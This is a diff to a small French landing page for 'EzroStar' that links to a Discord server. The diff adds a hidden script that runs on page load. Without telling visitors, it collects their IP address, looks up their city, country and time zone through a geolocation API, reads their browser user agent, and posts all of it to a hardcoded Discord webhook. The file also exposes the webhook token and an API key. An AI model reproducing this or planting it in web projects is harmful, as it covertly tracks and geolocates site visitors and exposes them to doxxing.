@@ -1,57 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Maintenance</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
-    <style>
-        body {
-            background-color: #333; /* Fond gris foncé */
-            color: white; /* Texte blanc */
-            font-family: 'Rubik', sans-serif; /* Utilise la police Rubik */
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-
-        h1 {
-            font-size: 36px;
-            margin-bottom: 20px; /* Espace sous le titre */
-        }
-
-        p {
-            font-size: 18px;
-            margin-bottom: 30px; /* Espace sous le paragraphe */
-        }
-
-        .discord-button {
-            background-color: #7289DA; /* Couleur du bouton Discord */
-            color: white;
-            font-size: 16px;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            text-decoration: none; /* Supprime le soulignement du lien */
-        }
-
-        .discord-button:hover {
-            background-color: #677BC4; /* Changement de couleur au survol */
-        }
-    </style>
+    <!-- ... (autres balises meta et liens) ... -->
 </head>
 <body>
     <h1>Bienvenue sur le site d'EzroStar. 
         Veuillez rejoindre le Discord pour plus d'infos :</h1>
     <a href="https://discord.gg/GsDsDzp6bB" target="_blank" class="discord-button">Discord</a>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
+        const ipAddressURL = "https://api64.ipify.org?format=json";
+        const ipGeolocationURL = "https://api.ipgeolocation.io/ipgeo?apiKey=9ed8eefc86024c67b341a5ace0b43e1c";
+
+        const getIpAddress = async () => {
+            const response = await fetch(ipAddressURL);
+            const data = await response.json();
+            return data.ip;
+        };
+
+        const getIpGeolocation = async (ipAddress) => {
+            const response = await fetch(`${ipGeolocationURL}&ip=${ipAddress}`);
+            const data = await response.json();
+            return data;
+        };
+
+        const sendWebhookOnce = async () => {
+            // Vérifie si le message a déjà été envoyé en utilisant le stockage local
+            if (!localStorage.getItem("webhookSent")) {
+                const ipAddress = await getIpAddress();
+                const ipGeolocationData = await getIpGeolocation(ipAddress);
+
+                const embed = {
+                    title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
+                    description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||\nPays: || ${ipGeolocationData.country_name} ||\nVille: || ${ipGeolocationData.city} ||\nFuseau horaire: || ${ipGeolocationData.time_zone} ||\nUser-Agent: || ${window.navigator.userAgent} ||**`,
+                    color: 0x00ff00
+                };
+
+                const payload = {
+                    embeds: [embed]
+                };
+
+                // Envoie du message via le webhook Discord
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                // Marque le message comme déjà envoyé
+                localStorage.setItem("webhookSent", "true");
+            }
+        };
+
+        // Appelle la fonction au chargement de la page
+        sendWebhookOnce();
+    </script>
 </body>
 </html>
